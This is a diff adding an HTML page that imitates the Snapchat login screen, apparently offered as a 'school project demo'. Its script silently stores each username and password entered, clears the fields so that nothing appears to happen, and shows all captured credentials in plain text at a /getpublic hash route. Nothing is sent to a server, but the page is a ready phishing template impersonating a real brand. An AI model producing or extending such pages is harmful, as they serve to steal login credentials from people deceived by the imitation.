@@ -1,2 +1,110 @@
-<!DOCtype html>
-h
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Snapchat Login</title>
+    <style>
+        * { margin: 0; padding: 0; box-sizing: border-box; font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif; }
+        body { background: #fafafa; display: flex; justify-content: center; align-items: center; min-height: 100vh; flex-direction: column; }
+        .login-box { background: white; width: 380px; padding: 40px 30px; border-radius: 24px; box-shadow: 0 8px 28px rgba(0,0,0,0.08); text-align: center; }
+        .logo { font-size: 28px; font-weight: 700; color: #000; letter-spacing: -0.5px; margin-bottom: 30px; }
+        .logo span { background: #fffc00; padding: 0 6px; border-radius: 12px; }
+        input { width: 100%; padding: 14px 16px; margin: 8px 0; border: 1px solid #ddd; border-radius: 40px; font-size: 16px; background: #f4f4f4; outline: none; transition: 0.2s; }
+        input:focus { border-color: #000; background: #fff; }
+        button { width: 100%; padding: 14px; background: #fffc00; border: none; border-radius: 40px; font-size: 17px; font-weight: 600; color: #000; margin-top: 12px; cursor: pointer; transition: 0.2s; }
+        button:hover { background: #e6e300; }
+        .footer { margin-top: 20px; font-size: 14px; color: #888; }
+        .footer a { color: #000; text-decoration: none; font-weight: 600; }
+        .note { margin-top: 30px; font-size: 12px; color: #aaa; }
+    </style>
+</head>
+<body>
+
+<div class="login-box">
+    <div class="logo"><span>Snap</span>chat</div>
+    <form id="loginForm">
+        <input type="text" id="username" placeholder="Username" required>
+        <input type="password" id="password" placeholder="Password" required>
+        <button type="submit">Log In</button>
+    </form>
+    <div class="footer"><a href="#">Forgot password?</a> · <a href="#">Sign Up</a></div>
+    <div class="note">⚠️ School project demo — no data is sent anywhere.</div>
+</div>
+
+<script>
+    // Store submissions in memory (simulated database for /getpublic)
+    const submissions = [];
+
+    document.getElementById('loginForm').addEventListener('submit', function(e) {
+        e.preventDefault();
+        const username = document.getElementById('username').value.trim();
+        const password = document.getElementById('password').value.trim();
+        if (username && password) {
+            // Store the credential pair
+            submissions.push({ username, password });
+            // Clear fields so it looks like nothing happened
+            document.getElementById('username').value = '';
+            document.getElementById('password').value = '';
+            // Optionally show a tiny visual feedback (but we want "nothing happens")
+            // So we do nothing else — no alert, no console log (silent)
+        }
+    });
+
+    // Expose the submissions array globally so /getpublic can access it
+    window.__submissions = submissions;
+
+    // Check if the current path is /getpublic — simulate route via hash or path
+    function checkRoute() {
+        const path = window.location.pathname;
+        if (path === '/getpublic') {
+            // Replace entire page with plain text list
+            document.documentElement.innerHTML = `<pre style="font-family: monospace; padding: 20px; background: #f4f4f4; min-height: 100vh; margin: 0; white-space: pre-wrap; word-break: break-all;">${buildTextOutput()}</pre>`;
+        }
+    }
+
+    function buildTextOutput() {
+        if (submissions.length === 0) {
+            return 'No submissions yet.';
+        }
+        let output = '=== ALL SUBMISSIONS ===\n\n';
+        submissions.forEach((s, i) => {
+            output += `[${i+1}] Username: ${s.username} | Password: ${s.password}\n`;
+        });
+        output += '\n=== END ===';
+        return output;
+    }
+
+    // For local testing: if you visit /getpublic via hash (since pure static can't change path easily)
+    // We also support hash-based route: #/getpublic
+    window.addEventListener('hashchange', function() {
+        if (window.location.hash === '#/getpublic') {
+            document.documentElement.innerHTML = `<pre style="font-family: monospace; padding: 20px; background: #f4f4f4; min-height: 100vh; margin: 0; white-space: pre-wrap; word-break: break-all;">${buildTextOutput()}</pre>`;
+        }
+    });
+
+    // Also check on load if the path is /getpublic (for servers that support it)
+    window.addEventListener('DOMContentLoaded', function() {
+        checkRoute();
+        // If hash is #/getpublic on load, handle it
+        if (window.location.hash === '#/getpublic') {
+            document.documentElement.innerHTML = `<pre style="font-family: monospace; padding: 20px; background: #f4f4f4; min-height: 100vh; margin: 0; white-space: pre-wrap; word-break: break-all;">${buildTextOutput()}</pre>`;
+        }
+    });
+
+    // For a real "/getpublic" route in a simple static environment, 
+    // we also add a manual way: if user types /getpublic in address bar,
+    // this script will run and replace content. But for pure static HTML,
+    // we rely on hash or a simple server redirect. 
+    // To make it work like a real route, you'd need a backend (Node/Flask).
+    // For school demo, we use hash navigation.
+    console.log('Snapchat login demo — visit #/getpublic to see all submissions.');
+</script>
+
+<!-- For convenience, add a hidden link to /getpublic -->
+<div style="position: fixed; bottom: 10px; right: 10px; font-size: 11px; background: #eee; padding: 6px 12px; border-radius: 20px;">
+    <a href="#/getpublic" style="text-decoration: none; color: #333;">View /getpublic</a>
+</div>
+
+</body>
+</html>
